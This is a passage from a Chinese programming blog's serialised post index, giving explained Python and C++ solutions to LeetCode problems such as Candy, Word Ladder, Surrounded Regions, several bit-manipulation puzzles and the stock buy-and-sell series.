maxCandy = 1 if index + 1 &lt; n and ratings[index] &gt; ratings[index+1]: maxCandy = ans[index+1] + 1 if index - 1 &gt;=0 and ratings[index] &gt; ratings[index-1]: if maxCandy &lt;= ans[index-1]: maxCandy=ans[index-1]+1 ans[index] = maxCandy return sum(ans) code2: O(nlogn)太慢，虽然可以过。但是可以优化到O(n)。 初始化所有孩子糖果为1颗，接下来从做到右扫描进行“修正”。 假设我们只考虑左边孩子的情况，如果当前孩子大于左边孩子，那么糖果要在左边孩子基础上+1. 这样扫描一遍以后，我们可以保证，对于任意的 i &gt; 0 有 ans[i]&gt;ans[i-1] ( if ratings[i] &gt;rating[i-1]) 接下来从右向左扫描，如果当前孩子大于右边的孩子，并且糖果数少于右边的，要在右边的孩子基础上+1 总结如下：第一次扫描保证了每个比左边高分的孩子比左边的糖果多，第二次则是右边。 Python 12345678910111213141516171819class Solution(object): def candy(self, ratings): &quot;&quot;&quot; :type ratings: List[int] :rtype: int &quot;&quot;&quot; if not ratings: return 0 n = len(ratings) ans = [1] * n for i in range(1, n): if ratings[i] &gt; ratings[i - 1]: ans[i] = ans[i - 1] + 1 for i in range(n - 2, -1, -1): if ratings[i] &gt; ratings[i + 1] and ans[i] &lt;= ans[i + 1]: ans[i] = ans[i + 1] + 1 return sum(ans) C++ 1234567891011121314class Solution &#123;public: int candy(vector&lt;int&gt;&amp; ratings) &#123; vector&lt;int&gt; dp(ratings.size(), 1); for(int i = 1; i &lt; ratings.size(); ++i) if(ratings[i - 1] &lt; ratings[i] &amp;&amp; dp[i] &lt;= dp[i - 1]) dp[i] = dp[i - 1] + 1; for(int i = ratings.size() - 2; i &gt;= 0; --i) if(ratings[i + 1] &lt; ratings[i] &amp;&amp; dp[i] &lt;= dp[i + 1]) dp[i] = dp[i + 1] + 1; return accumulate(dp.begin(), dp.end(), 0); &#125;&#125;;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode BFS","slug":"leetcode-bfs","date":"2015-03-07T07:15:57.000Z","updated":"2021-01-08T13:32:16.893Z","comments":true,"path":"leetcode-bfs/","link":"","permalink":"https://www.hrwhisper.me/leetcode-bfs/","excerpt":"本次题解包括： 126 Word Ladder II 127 Word Ladder 130 Surrounded Regions","text":"本次题解包括： 126 Word Ladder II 127 Word Ladder 130 Surrounded Regions 127 Word Ladder Given two words (start and end), and a dictionary, find the length of shortest transformation sequence from start to end, such that: Only one letter can be changed at a time Each intermediate word must exist in the dictionary For example, Given: start = \"hit\" end = \"cog\" dict = [\"hot\",\"dot\",\"dog\",\"lot\",\"log\"] As one shortest transformation is \"hit\" -&gt; \"hot\" -&gt; \"dot\" -&gt; \"dog\" -&gt; \"cog\", return its length 5. Note: Return 0 if there is no such transformation sequence. All words have the same length. All words contain only lowercase alphabetic characters. 题目地址：leetcode Surrounded Regions 题意：给定起始和结束字符串，还有个字典，要求每次最多变化一个字母成字典里的单词，求最短的步数使得起始字符串变为结束字符串。 思路：BFS。一开始TLE了，看了DISCUSS人家是直接变换字符串！而我是比较每个单词是否差一个字母。 废话不多说。 将start入队列 每次取出队首（一共取当前层的长度），对队首每个字母分别进行变换（a~z)，判断其是否在字典中，如果存在，加入队列。 每一层结束后，将dis+1 改进版是用双向BFS，这样速度更快。 和单向的不同在于，如果取出队首进行变化，变化的某一个字符串t在另一个方向的bfs中(如从start开始遍历的，而end已经遍历过t）说明有start-&gt;end的路径，将步数和累加即可。 单向的BFS 1234567891011121314151617181920212223class Solution: # @param start, a string # @param end, a string # @param dict, a set of string # @return an integer def ladderLength(self, start, end, dic): if start==end: return 1 n =len(start) atoz=map(chr,xrange(ord(&#x27;a&#x27;),ord(&#x27;z&#x27;)+1)) q , vis ,dis= [start],set(),2 vis.add(start) while q: for i in xrange(len(q)): cur = q.pop(0) for j in xrange(n): for k in atoz: t=cur[:j]+k+cur[j+1:] if t==end:return dis if t in dic and t not in vis : q.append(t) vis.add(t) dis+=1 return 0 双向BFS 123456789101112131415161718192021222324252627282930313233class Solution: # @param start, a string # @param end, a string # @param dict, a set of string # @return an integer def ladderLength(self, start, end, dic): if start==end: return 1 n =len(start) atoz=map(chr,xrange(ord(&#x27;a&#x27;),ord(&#x27;z&#x27;)+1)) q_start , vis_start ,dis_start= [start],set([start]),1 q_end , vis_end, dis_end = [end],set([end]),1 while q_start and q_end: for i in xrange(len(q_start)): cur = q_start.pop(0) for j in xrange(n): for k in atoz: t=cur[:j]+k+cur[j+1:] if t in vis_end:return dis_start+dis_end if t in dic and t not in vis_start : q_start.append(t) vis_start.add(t) dis_start+=1 for i in xrange(len(q_end)): cur = q_end.pop(0) for j in xrange(n): for k in atoz: t=cur[:j]+k+cur[j+1:] if t in vis_start:return dis_start+dis_end if t in dic and t not in vis_end : q_end.append(t) vis_end.add(t) dis_end+=1 return 0 126 Word Ladder II Given two words (start and end), and a dictionary, find all shortest transformation sequence(s) from start to end, such that: Only one letter can be changed at a time Each intermediate word must exist in the dictionary For example, Given: start = \"hit\" end = \"cog\" dict = [\"hot\",\"dot\",\"dog\",\"lot\",\"log\"] Return 12345[ [&quot;hit&quot;,&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;cog&quot;], [&quot;hit&quot;,&quot;hot&quot;,&quot;lot&quot;,&quot;log&quot;,&quot;cog&quot;]] Note: All words have the same length. All words contain only lowercase alphabetic characters. 传送门 题意：给定起始和结束字符串，还有个字典，要求每次最多变化一个字母成字典里的单词，，输出所有最短的步数使得起始字符串变为结束字符串的过程。 思路：请先做127题！ 一开始是采用类似127的做法，不过每次入队列的是路径，每次取路径最后一个元素判断。结果TLE了。 后来参考别人做法，先BFS出路径，然后DFS。还是TLE了。 之后把图建出来，只要a和b相差一个字母，那么我们就建一条a-&gt;b 和b-&gt;a的边。 再进行BFS。 需要注意的是： 标记使用过的单词应该这一层都遍历过才能标记，否则会出现答案不全。 1234567891011121314151617181920212223242526272829303132333435class Solution: # @param start, a string # @param end, a string # @param dict, a set of string # @return an integer def findLadders(self, start, end, dic): n =len(start) edge= &#123;&#125; dic.add(start) dic.add(end) for i in dic: edge[i]=[] for cur in dic: for j in xrange(n): for k in xrange(ord(cur[j])+1, 123): to=cur[:j]+chr(k)+cur[j+1:] if to in dic : edge[to].append(cur) edge[cur].append(to) q ,vis , ans =[[start]] ,set([start]) ,[] flag=False while not flag and q: allword=[] for _ in xrange(len(q)): curPath = q.pop(0) cur=curPath[-1] for i in edge[cur]: if i==end: ans.append(curPath+[end]) flag=True if i not in vis: q.append(curPath+[i]) allword.append(i) vis = set(allword) return ans 130 Surrounded Regions Given a 2D board containing 'X' and 'O', capture all regions surrounded by 'X'. A region is captured by flipping all 'O's into 'X's in that surrounded region. For example, 12345X X X XX O O XX X O XX O X X After running your function, the board should be: 1234X X X XX X X XX X X XX O X X 题目地址：leetcode Surrounded Regions 题目大意：给定二维数组，如果一些O四周（上下左右）都是X，那么将O改为X。 思路：BFS。把O相邻的所有加入队列。如果有一个可以触碰到边界，那么说明没有全部为X，不用替换。 123456789101112131415161718192021222324252627282930313233class Solution: # @param board, a 2D array # Capture all regions by modifying the input board in-place. # Do not return any value. def solve(self, board): if not board: return m , n = len(board),len(board[0]) vis =[[False for j in range(n)]for i in range(m)] dx,dy= [1,-1,0,0],[0,0,1,-1] for i in range(m): for j in range(n): if board[i][j]==&#x27;X&#x27; or vis[i][j]: continue q,q2=[],[] flag = True q.append((i,j)) q2.append((i,j)) while q: curx ,cury=q.pop(0) for k in range(4): nx , ny = curx+dx[k],cury+dy[k] if nx &lt; 0 or ny &lt;0 or nx &gt;=m or ny&gt;=n: flag=False continue if vis[nx][ny] or board[nx][ny]==&#x27;X&#x27;: continue vis[nx][ny]= True q.append((nx,ny)) q2.append((nx,ny)) if flag: for x,y in q2: board[x][y]=&#x27;X&#x27; 但其实有更简单的方法： 将边界上的点及其可达的O标记为‘A'，然后遍历board, 将A改为O, 将O改为X即可。 C++ 1234567891011121314151617181920212223242526272829303132333435363738394041const int dx[] = &#123; 1, -1, 0, 0 &#125;;const int dy[] = &#123; 0, 0, 1, -1 &#125;;class Solution &#123; void dfs(int i, int j, vector&lt;vector&lt;char&gt;&gt; &amp;board) &#123; board[i][j] = &#x27;A&#x27;; for (int k = 0; k &lt; 4; ++k) &#123; int nx = i + dx[k], ny = j + dy[k]; if (nx &lt; 0 || ny &lt; 0 || nx &gt;= board.size() || ny &gt;= board[0].size()) continue; if (board[nx][ny] == &#x27;O&#x27;) &#123; dfs(nx, ny, board); &#125; &#125; &#125;public: void solve(vector&lt;vector&lt;char&gt;&gt;&amp; board) &#123; if (board.empty()) return; for (int i = 0; i &lt; board.size(); ++i) &#123; if (board[i][0] == &#x27;O&#x27;) dfs(i, 0, board); if (board[i][board[0].size() - 1] == &#x27;O&#x27;) dfs(i, board[0].size() - 1, board); &#125; for (int j = 0; j &lt; board[0].size(); ++j) &#123; if (board[0][j] == &#x27;O&#x27;) dfs(0, j, board); if (board[board.size() - 1][j] == &#x27;O&#x27;) dfs(board.size() - 1, j, board); &#125; for (int i = 0; i &lt; board.size(); ++i) &#123; for (int j = 0; j &lt; board[0].size(); ++j) &#123; if (board[i][j] == &#x27;A&#x27;) board[i][j] = &#x27;O&#x27;; else if (board[i][j] == &#x27;O&#x27;) board[i][j] = &#x27;X&#x27;; &#125; &#125; &#125;&#125;; Python 1234567891011121314151617181920212223242526272829class Solution(object): def dfs(self, i, j, board): if board[i][j] != &#x27;O&#x27;: return board[i][j] = &#x27;A&#x27; for nx, ny in [(i + 1, j), (i - 1, j), (i, j + 1), (i, j - 1)]: if nx &lt; 0 or ny &lt; 0 or nx &gt;= len(board) or ny &gt;= len(board[0]): continue self.dfs(nx, ny, board) def solve(self, board): &quot;&quot;&quot; :type board: List[List[str]] :rtype: void Do not return anything, modify board in-place instead. &quot;&quot;&quot; if not board or not board[0]: return for i in range(len(board)): self.dfs(i, 0, board) self.dfs(i, len(board[0]) - 1, board) for j in range(len(board[0])): self.dfs(0, j, board) self.dfs(len(board) - 1, j, board) for i in range(len(board)): for j in range(len(board[0])): if board[i][j] == &#x27;O&#x27;: board[i][j] = &#x27;X&#x27; elif board[i][j] == &#x27;A&#x27;: board[i][j] = &#x27;O&#x27;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode 位运算","slug":"leetcode-bit-manipulation","date":"2015-03-06T07:31:00.000Z","updated":"2021-01-08T13:32:16.895Z","comments":true,"path":"leetcode-bit-manipulation/","link":"","permalink":"https://www.hrwhisper.me/leetcode-bit-manipulation/","excerpt":"本次题解包括 89. Gray Code 136 Single Number 137 Single Number II 190 Reverse Bits 191 Number of 1 Bits 201 Bitwise AND of Numbers Range 260 Single Number III 268 Missing Number","text":"本次题解包括 89. Gray Code 136 Single Number 137 Single Number II 190 Reverse Bits 191 Number of 1 Bits 201 Bitwise AND of Numbers Range 260 Single Number III 268 Missing Number 89. Gray Code The gray code is a binary numeral system where two successive values differ in only one bit. Given a non-negative integer n representing the total number of bits in the code, print the sequence of gray code. A gray code sequence must begin with 0. For example, given n = 2, return [0,1,3,2]. Its gray code sequence is: 00 - 0 01 - 1 11 - 3 10 - 2 Note: For a given n, a gray code sequence is not uniquely defined. For example, [0,2,3,1] is also a valid gray code sequence according to the above definition. For now, the judge is able to judge based on one instance of gray code sequence. Sorry about that. 题目地址：leetcode Gray Code 题目大意：给定数字n，要你输出[0, 2^n - 1]格雷码。 思路：二进制x转化为格雷码的操作是 x ^ (x&gt;&gt; 1) C++ 123456789class Solution &#123;public: vector&lt;int&gt; grayCode(int n) &#123; vector&lt;int&gt; ans; for(int i = 0; i &lt; (1 &lt;&lt; n); ++i) ans.push_back(i ^ (i &gt;&gt; 1)); return ans; &#125;&#125;; Python 1234567class Solution(object): def grayCode(self, n): &quot;&quot;&quot; :type n: int :rtype: List[int] &quot;&quot;&quot; return [i ^ (i &gt;&gt; 1) for i in range(1 &lt;&lt; n)] 136. Single Number Given an array of integers, every element appears twice except for one. Find that single one. Note: Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory? 题目地址：leetcode Single Number 题意：一个数组，除了一个元素出现一次外，其余每个元素都是出现两次，求出只出现过一次的元素 思路：用异或的性质，两次异或等于本身。so~ C++ 123456789class Solution &#123;public: int singleNumber(vector&lt;int&gt;&amp; nums) &#123; int ans = 0; for(int num: nums) ans ^= num; return ans; &#125;&#125;; Python 12345678910class Solution(object): def singleNumber(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; ans = 0 for num in nums: ans ^= num return ans 137. Single Number II Given an array of integers, every element appears three times except for one. Find that single one. Note: Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory? 题目地址：leetcode Single Number II 题意：一个数组，除了一个元素出现一次外，其余每个元素都是出现三次，求出只出现过一次的元素 思路： 方法1 输入为Int有32位，对数组中每个数的各个位上进行相加，然后Mod3就是该位上只出现一次应该取的值。 C++ 1234567891011121314class Solution &#123;public: int singleNumber(vector&lt;int&gt;&amp; nums) &#123; int ans = 0; for (int i = 0; i &lt; 32; ++i) &#123; int cnt = 0; for (int num : nums) &#123; cnt += (num &gt;&gt; i) &amp; 1; &#125; ans |= (cnt % 3) &lt;&lt; i; &#125; return ans; &#125;&#125;; Python python需要注意的是如果有负数出现，那么py最后进行移位不会认为它是负数，而是认为它是一个正数！ 故需手动判断最高位是否为1，如果为1代表负数，求其补码（取反，末位+1） 12345678class Solution: def singleNumber(self, nums: List[int]) -&gt; int: ans = 0 for i in range(32): cnt = sum([(num &gt;&gt; i) &amp; 1 for num in nums]) ans |= (cnt % 3) &lt;&lt; i return ans if ans &amp; 0x80000000 == 0 else -((ans ^ 0xffffffff) + 1) 方法2 上面的方法遍历了nums数组32次，虽然时间复杂度仍为\\(O(n)\\)，但是可以继续改进：可以只遍历一遍就分析出结果！ 解法1中其实就是计数然后mod 3，因此每个位可能有余数为0\\1\\2三种情况，而一个二进制只能表示2种情况，因此我们需要2位数来表示，即00 01 10三种情况，用two来表示2位数的高位，one来表示2位数的低位，可以根据输入num来写出如下的转移表 num two one 转以后： two one 0 0 0 0 0 0 0 1 0 1 0 1 0 1 0 1 0 0 0 1 1 0 1 1 0 1 1 0 0 0 因此可以看出，one = one ^ num &amp; ~two，即one计算其实就是简单的按位加（异或），但是当two == 1的时候，设置为0 类似的有two = two ^ num &amp; ~one 1234567class Solution: def singleNumber(self, nums: List[int]) -&gt; int: one = two = 0 for num in nums: one = one ^ num &amp; ~two two = two ^ num &amp; ~one return one 190. Reverse Bits Reverse bits of a given 32 bits unsigned integer. For example, given input 43261596 (represented in binary as 00000010100101000001111010011100), return 964176192 (represented in binary as00111001011110000010100101000000). Follow up: If this function is called many times, how would you optimize it? 传送门 题意：给定一个32位无符号整形，求把它的二进制颠倒顺序的结果。 思路：将ans左移并且加上n的最高位，然后将n右移，直到n为0。最后，需要左移上n前导0的个数。 12345678910class Solution: # @param n, an integer # @return an integer def reverseBits(self, n): ans = cnt = 0 while n: ans = (ans&lt;&lt;1) + (n&amp;1) n &gt;&gt;=1 cnt+=1 return ans&lt;&lt;(32-cnt) 191. Number of 1 Bits Write a function that takes an unsigned integer and returns the number of ’1' bits it has (also known as the Hamming weight). For example, the 32-bit integer ’11' has binary representation 00000000000000000000000000001011, so the function should return 3. 传送门 题意：给定一个32位整型，求它1 的个数 思路： 方法一 每次 &amp;1 右移即可。 Python: 12345class Solution: # @param n, an integer # @return an integer def hammingWeight(self, n): return 0 if n==0 else (n&amp;1) + self.hammingWeight(n&gt;&gt;1) 其实上面一行代码只是下面这个的好看版。哈哈 123456789class Solution: # @param n, an integer # @return an integer def hammingWeight(self, n): cnt = 0 while n: if n&amp;1: cnt+=1 n&gt;&gt;=1 return cnt C++ 1234567891011class Solution &#123;public: int hammingWeight(uint32_t n) &#123; int res = 0; while(n)&#123; if(n&amp;1) res++; n &gt;&gt;=1; &#125; return res; &#125;&#125;; 方法二： 先考虑一下我们从一个数减去1的时候发生了什么。 如： 0111 0000 - 1 = 0110 1111 就是从最低位到最低的1那一位全部取反。 接下来，我们看看n &amp; (n-1) 0111 0000 &amp; 0110 1111 = 0110 0000 我们看到，最后一个1变成了0，所以我们只需要O(m)次 ，m为1的个数就可以求出1的个数 C++ 1234567891011class Solution &#123;public: int hammingWeight(uint32_t n) &#123; int res = 0; while(n)&#123; n = n &amp; ( n - 1 ); res++; &#125; return res; &#125;&#125;; Python 1234567class Solution(object): def hammingWeight(self, n): numOnes = 0 while n: n = n &amp; (n-1) numOnes += 1 return numOnes 201. Bitwise AND of Numbers Range Given a range [m, n] where 0 &lt;= m &lt;= n &lt;= 2147483647, return the bitwise AND of all numbers in this range, inclusive. For example, given the range [5, 7], you should return 4. 传送门 题意：给定m和n，求从m连续 按位与到 n 的结果 思路： 一开始想，如果m的长度小于n，那结果必为0。只有一样长度的才需要进行与，所以写出如下代码： 123456789101112131415class Solution: # @param m, an integer # @param n, an integer # @return an integer def rangeBitwiseAnd(self, m, n): def num_len(m): res = 0 while m: m , res = m&gt;&gt;1 ,res+1 return res m_len , n_len= num_len(m),num_len(n) if m_len &lt; n_len: return 0 ans = m for i in xrange(m+1,n+1): ans = ans &amp; i return ans 虽然1A，但是实际上我们只需要求两个数字的二进制的最长公共前缀即可！ 12345678class Solution: # @param m, an integer # @param n, an integer # @return an integer def rangeBitwiseAnd(self, m, n): cnt = 0 while m!=n: m,n,cnt=m&gt;&gt;1,n&gt;&gt;1,cnt+1 return n&lt;&lt;cnt 260. Single Number III Given an array of numbers nums, in which exactly two elements appear only once and all the other elements appear exactly twice. Find the two elements that appear only once. For example: Given nums = [1, 2, 1, 3, 2, 5], return [3, 5]. Note: The order of the result is not important. So in the above example, [5, 3] is also correct. Your algorithm should run in linear runtime complexity. Could you implement it using only constant space complexity? 题目地址：leetcode Single Number III 题意：给定一个数组，里面只有两个元素a,b出现一次，其他的元素均出现两次，求a,b 思路： Once again, we need to use XOR to solve this problem. But this time, we need to do it in two passes: In the first pass, we XOR all elements in the array, and get the XOR of the two numbers we need to find. Note that since the two numbers are distinct, so there must be a set bit (that is, the bit with value '1') in the XOR result. Find out an arbitrary set bit (for example, the rightmost set bit). In the second pass, we divide all numbers into two groups, one with the aforementioned bit set, another with the aforementinoed bit unset. Two different numbers we need to find must fall into thte two distrinct groups. XOR numbers in each group, we can find a number in either group.From https://discuss.leetcode.com/topic/21605/accepted-c-java-o-n-time-o-1-space-easy-solution-with-detail-explanations 就是首先先异或一次，这样就得到了a^b的值diff，接着由于a!=b，所以diff!=0，我们找diff最低位的元素作为分类的依据。（diff = diff&amp;-diff 类似树状数组）因为，a和b这个位置的二进制不同，借此把a和b划分开。 接着，遍历数组，对于数组中的元素num, 若num &amp; diff == 0 我们归为第一组，a ^= num 否则就是b^=num啦 C++ 1234567891011class Solution &#123;public: vector&lt;int&gt; singleNumber(vector&lt;int&gt;&amp; nums) &#123; int diff = accumulate(nums.begin(), nums.end(),0, bit_xor&lt;int&gt;()); diff &amp;= -diff; //lower bit vector&lt;int&gt; ans(2, 0); for (int num:nums) ans[(num &amp; diff) == 0] ^= num; return ans; &#125;&#125;; Python3 12345678class Solution: def singleNumber(self, nums: List[int]) -&gt; List[int]: x = functools.reduce(lambda a, b: a ^ b, nums, 0) x = x &amp; -x ans = [0, 0] for num in nums: ans[num &amp; x == 0] ^= num return ans 268. Missing Number Given an array containing n distinct numbers taken from 0, 1, 2, ..., n, find the one that is missing from the array. For example, Given nums = [0, 1, 3] return 2. Note: Your algorithm should run in linear runtime complexity. Could you implement it using only constant extra space complexity? 题目地址：leetcode Missing Number 题意：给定一个n个元素组成的数组，求0~n中缺失了哪一个？ 思路： 看到这个，立马就觉得直接sum求和，也过了（其实数据量大会overflow） 12345678class Solution &#123;public: int missingNumber(vector&lt;int&gt;&amp; nums) &#123; int sum = 0; for(int num:nums) sum += num; return (((1+nums.size()) * nums.size() ) &gt;&gt;1) - sum; &#125;&#125;; Python 1234567class Solution(object): def missingNumber(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; return (((1 + len(nums)) * len(nums)) &gt;&gt; 1 )- sum(nums) 更好的方法是异或，利用两次异或 = 没有异或的性质 （如 x ^ 1 ^ 1 = x） 1234567891011class Solution &#123;public: int missingNumber(vector&lt;int&gt;&amp; nums) &#123; int x = 0; for(int i=0;i&lt;nums.size();i++) &#123; x ^= i; x ^= nums[i]; &#125; return x ^ nums.size(); &#125;&#125;;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"https://www.hrwhisper.me/tags/Bit-Manipulation/"}]},{"title":"leetcode Best Time to Buy and Sell Stock","slug":"leetcode-best-time-to-buy-and-sell-stock-i-ii-iii-iv","date":"2015-03-06T04:48:39.000Z","updated":"2021-01-09T14:09:43.531Z","comments":true,"path":"leetcode-best-time-to-buy-and-sell-stock-i-ii-iii-iv/","link":"","permalink":"https://www.hrwhisper.me/leetcode-best-time-to-buy-and-sell-stock-i-ii-iii-iv/","excerpt":"本次题解包括 121 Best Time to Buy and Sell Stock 122 Best Time to Buy and Sell Stock II 123 Best Time to Buy and Sell Stock III 188 Best Time to Buy and Sell Stock IV 714. Best Time to Buy and Sell Stock with Transaction Fee","text":"本次题解包括 121 Best Time to Buy and Sell Stock 122 Best Time to Buy and Sell Stock II 123 Best Time to Buy and Sell Stock III 188 Best Time to Buy and Sell Stock IV 714. Best Time to Buy and Sell Stock with Transaction Fee 121 Best Time to Buy and Sell Stock Say you have an array for which the ith element is the price of a given stock on day i. If you were only permitted to complete at most one transaction (i.e., buy one and sell one share of the stock), design an algorithm to find the maximum profit. Note that you cannot sell a stock before you buy one. Example 1: 1234Input: [7,1,5,3,6,4]Output: 5Explanation: Buy on day 2 (price &#x3D; 1) and sell on day 5 (price &#x3D; 6), profit &#x3D; 6-1 &#x3D; 5. Not 7-1 &#x3D; 6, as selling price needs to be larger than buying price. Example 2: 123Input: [7,6,4,3,1]Output: 0Explanation: In this case, no transaction is done, i.e. max profit &#x3D; 0. 传送门 题意：给定股票每日的售价，求 一次买进和一次卖出最多可以获取多大利润？ 思路：其实就是求买进时和卖出是最大差价。每次更新当前最小价格，dp即可。 python 123456789class Solution: def maxProfit(self, prices: List[int]) -&gt; int: if not prices: return 0 min_v = prices[0] ans = 0 for i, price in enumerate(prices): ans = max(ans, price - min_v) min_v = min(price, min_v) return ans 122 Best Time to Buy and Sell Stock II Say you have an array prices for which the ith element is the price of a given stock on day i. Design an algorithm to find the maximum profit. You may complete as many transactions as you like (i.e., buy one and sell one share of the stock multiple times). Note: You may not engage in multiple transactions at the same time (i.e., you must sell the stock before you buy again). Example 1: 1234Input: [7,1,5,3,6,4]Output: 7Explanation: Buy on day 2 (price &#x3D; 1) and sell on day 3 (price &#x3D; 5), profit &#x3D; 5-1 &#x3D; 4. Then buy on day 4 (price &#x3D; 3) and sell on day 5 (price &#x3D; 6), profit &#x3D; 6-3 &#x3D; 3. Example 2: 12345Input: [1,2,3,4,5]Output: 4Explanation: Buy on day 1 (price &#x3D; 1) and sell on day 5 (price &#x3D; 5), profit &#x3D; 5-1 &#x3D; 4. Note that you cannot buy on day 1, buy on day 2 and sell them later, as you are engaging multiple transactions at the same time. You must sell before buying again. Example 3: 123Input: [7,6,4,3,1]Output: 0Explanation: In this case, no transaction is done, i.e. max profit &#x3D; 0. Constraints: 1 &lt;= prices.length &lt;= 3 * 10 ^ 4 0 &lt;= prices[i] &lt;= 10 ^ 4 传送门 题意：给定股票每日的售价，求 若干次买卖最多可以获取多大利润？ 思路：其实就是求股票低价买，高价卖最多能获得多少钱。求连续上升的高度和。 如12314为 1买进3卖出1买进4卖出。 python 123456789101112class Solution: def maxProfit(self, prices: List[int]) -&gt; int: if not prices : return 0 ans, money, n = 0, prices[0], len(prices) i = 0 while i &lt; n: money = prices[i] while i + 1 &lt; n and prices[i] &lt;= prices[i + 1]: i += 1 ans += prices[i] - money i +=1 return ans 还可以这么写： 1234567891011class Solution: # @param prices, a list of integer # @return an integer def maxProfit(self, prices): if not prices : return 0 ans = 0 for i in xrange(1,len(prices)): if prices[i] &gt; prices[i-1] : ans += prices[i] - prices[i-1] return ans c++版本 12345678910111213141516class Solution &#123;public: int maxProfit(vector&lt;int&gt;&amp; prices) &#123; int ans = 0; for (int i = 0; i &lt; prices.size(); ) &#123; int j = i + 1; while(j &lt; prices.size() &amp;&amp; prices[j] &gt;= prices[j - 1]) &#123; ++j; &#125; --j; ans += prices[j] - prices[i]; i = j + 1; &#125; return ans; &#125;&#125;; 123 Best Time to Buy and Sell Stock III Say you have an array for which the ith element is the price of a given stock on day i. Design an algorithm to find the maximum profit. You may complete at most two transactions. Note: You may not engage in multiple transactions at the same time (i.e., you must sell the stock before you buy again). Example 1: 1234Input: prices &#x3D; [3,3,5,0,0,3,1,4]Output: 6Explanation: Buy on day 4 (price &#x3D; 0) and sell on day 6 (price &#x3D; 3), profit &#x3D; 3-0 &#x3D; 3.Then buy on day 7 (price &#x3D; 1) and sell on day 8 (price &#x3D; 4), profit &#x3D; 4-1 &#x3D; 3. Example 2: 1234Input: prices &#x3D; [1,2,3,4,5]Output: 4Explanation: Buy on day 1 (price &#x3D; 1) and sell on day 5 (price &#x3D; 5), profit &#x3D; 5-1 &#x3D; 4.Note that you cannot buy on day 1, buy on day 2 and sell them later, as you are engaging multiple transactions at the same time. You must sell before buying again. Example 3: 123Input: prices &#x3D; [7,6,4,3,1]Output: 0Explanation: In this case, no transaction is done, i.e. max profit &#x3D; 0. Example 4: 12Input: prices &#x3D; [1]Output: 0 Constraints: 1 &lt;= prices.length &lt;= 10^5 0 &lt;= prices[i] &lt;= 10^5 题目地址：Best Time to Buy and Sell Stock III 题意:给定股票每日的售价，求最多两次买卖最多可以获取多大利润？ 思路： 方法一：两遍DP 设dp[i]为到第i天能获取的最大值。（类似121题）求出dp后，逆向扫描数组。 nax_price为最大售价，每次减去price[i]得到第i天之后的利润，加上dp[i - 1]即为两次买卖的值。 C++ 12345678910111213141516171819class Solution &#123;public: int maxProfit(vector&lt;int&gt;&amp; prices) &#123; if(prices.empty()) return 0; vector&lt;int&gt; dp(prices.size(), 0); int min_price = prices[0]; for(int i = 1; i &lt; prices.size(); ++i)&#123; dp[i] = max(dp[i - 1], prices[i] - min_price); min_price = min(prices[i], min_price); &#125; int ans = dp.back(); int max_price = prices.back(); for(int i = prices.size() - 2; i &gt;= 1; --i)&#123; ans = max(ans, max_price - prices[i] + dp[i - 1]); max_price = max(max_price, prices[i]); &#125; return ans; &#125;&#125;; Python 1234567891011121314151617181920class Solution(object): def maxProfit(self, prices): &quot;&quot;&quot; :type prices: List[int] :rtype: int &quot;&quot;&quot; if not prices: return 0 dp = [0] * len(prices) min_price = prices[0] for i in range(1, len(prices)): dp[i] = max(dp[i - 1], prices[i] - min_price) min_price = min(prices[i], min_price) ans = dp[-1] max_price = prices[-1] for i in range(len(prices) - 2, 0, -1): ans = max(ans, max_price - prices[i] + dp[i - 1]) max_price = max(max_price, prices[i]) return ans 方法2：直接dp 设buy1[i]]为累计到i天买入一次最大的收益，sell1[i]为i天内卖出一次最大收益 buy2[i]为累积到第i天买入两次最大收益，sell2[i]为i天内共卖出两次最大收益 容易有下面的状态转移方程 buy1[i] = max(buy1[i - 1], -prices[i]); sell1[i] = max(sell1[i - 1], buy1[i - 1] + prices[i]); buy2[i] = max(buy2[i - 1], sell1[i - 1] - prices[i]); sell2[i] = max(sell2[i - 1], buy2[i - 1] + prices[i]); 初始化的时候，buy1[0] = -prices[0]这个比较好理解，而buy2[0] = -prices[0]这个可以理解为一天内买入卖出在买入。 最后，答案为max(0, sell1[-1], sell2[-1])这几个中，但是由于buy2的公式必定不小于buy1, sell2也必然不小于sell1，而sell2初始化为0，取的max更新，因此最后答案就是sell2[-1] 123456789101112131415161718class Solution &#123;public: int maxProfit(vector&lt;int&gt;&amp; prices) &#123; if (prices.empty()) return 0; vector&lt;int&gt; buy1(prices.size(), 0); vector&lt;int&gt; buy2(prices.size(), 0); vector&lt;int&gt; sell1(prices.size(), 0); vector&lt;int&gt; sell2(prices.size(), 0); buy1[0] = buy2[0] = -prices[0]; for (int i = 1; i &lt; prices.size(); ++i) &#123; buy1[i] = max(buy1[i - 1], -prices[i]); sell1[i] = max(sell1[i - 1], buy1[i - 1] + prices[i]); buy2[i] = max(buy2[i - 1], sell1[i - 1] - prices[i]); sell2[i] = max(sell2[i - 1], buy2[i - 1] + prices[i]); &#125; return sell2.back(); &#125;&#125;; 还可以进一步优化空间 123456789101112131415class Solution &#123;public: int maxProfit(vector&lt;int&gt;&amp; prices) &#123; if (prices.empty()) return 0; int buy1 = -prices[0], sell1 = 0; int buy2 = -prices[0], 